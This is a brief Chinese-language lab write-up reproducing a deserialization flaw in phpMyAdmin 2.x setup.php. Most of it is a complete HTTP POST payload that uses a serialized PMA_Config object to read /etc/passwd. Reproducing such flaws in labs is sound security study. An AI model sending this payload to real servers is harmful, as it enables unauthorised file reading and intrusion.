# Phpmyadmin Scripts / setup.php反序列化漏洞（WooYun-2016-199433）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->有回显读取文件

### 0x01漏洞介绍

phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码

##### 			影响版本

```
phpmyadmin 2.x
```

### 0x02漏洞复现

#### payload

```
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```

![Phpmyadmin_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Phpmyadmin_反序列化漏洞_1.jpg)

![Phpmyadmin_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Phpmyadmin_反序列化漏洞_2.jpg)

